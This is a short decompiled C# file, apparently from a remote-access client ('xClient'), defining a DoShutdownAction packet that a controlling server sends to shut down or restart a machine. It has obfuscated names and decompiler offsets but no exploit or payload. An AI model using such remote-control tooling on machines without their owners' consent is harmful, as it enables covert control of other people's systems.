using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
	// Token: 0x0200008D RID: 141
	[Serializable]
	public class DoShutdownAction : IPacket
	{
		// Token: 0x1700008A RID: 138
		// (get) Token: 0x060003A5 RID: 933 RVA: 0x00003CE3 File Offset: 0x00001EE3
		// (set) Token: 0x060003A6 RID: 934 RVA: 0x00003CEB File Offset: 0x00001EEB
		public GEnum2 Action { get; set; }

		// Token: 0x060003A7 RID: 935 RVA: 0x000021D4 File Offset: 0x000003D4
		public DoShutdownAction()
		{
		}

		// Token: 0x060003A8 RID: 936 RVA: 0x00003CF4 File Offset: 0x00001EF4
		public DoShutdownAction(GEnum2 action)
		{
			this.Action = action;
		}

		// Token: 0x060003A9 RID: 937 RVA: 0x00003D03 File Offset: 0x00001F03
		public void Execute(Client client)
		{
			client.Send<DoShutdownAction>(this);
		}
	}
}
